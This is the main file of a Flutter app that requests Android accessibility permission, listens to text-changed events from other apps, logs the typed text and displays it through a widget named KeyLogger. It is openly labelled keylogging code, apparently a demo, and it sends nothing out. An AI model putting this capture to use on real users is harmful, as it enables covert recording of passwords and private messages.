import 'dart:async';
import 'dart:developer';

import 'package:application/key_logger/key_logger.dart';
import 'package:application/services/accessibility_service.dart';
import 'package:flutter/material.dart';
import 'package:flutter_accessibility_service/flutter_accessibility_service.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final accessibilityService = AccessibilityService();
  await accessibilityService.requestPermission();

  runApp(MyApp(accessibilityService: accessibilityService));
}

class MyApp extends StatefulWidget {
  const MyApp({super.key, required this.accessibilityService});

  final AccessibilityService accessibilityService;

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  StreamSubscription<AccessibilityEvent>? _subscription;
  final _keyStreamController = StreamController<String>.broadcast();

  @override
  void initState() {
    super.initState();
    _subscription = widget.accessibilityService.events.listen((event) {
      if (event.eventType == EventType.typeViewTextChanged) {
        final nodes = event.nodesText;
        if (nodes != null && nodes.isNotEmpty) {
          log('Keys: $nodes');
          _keyStreamController.add(nodes.last);
        }
      }
    });
  }

  @override
  void dispose() {
    _subscription?.cancel();
    _keyStreamController.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        body: KeyLogger(keyStream: _keyStreamController.stream),
      ),
    );
  }
}
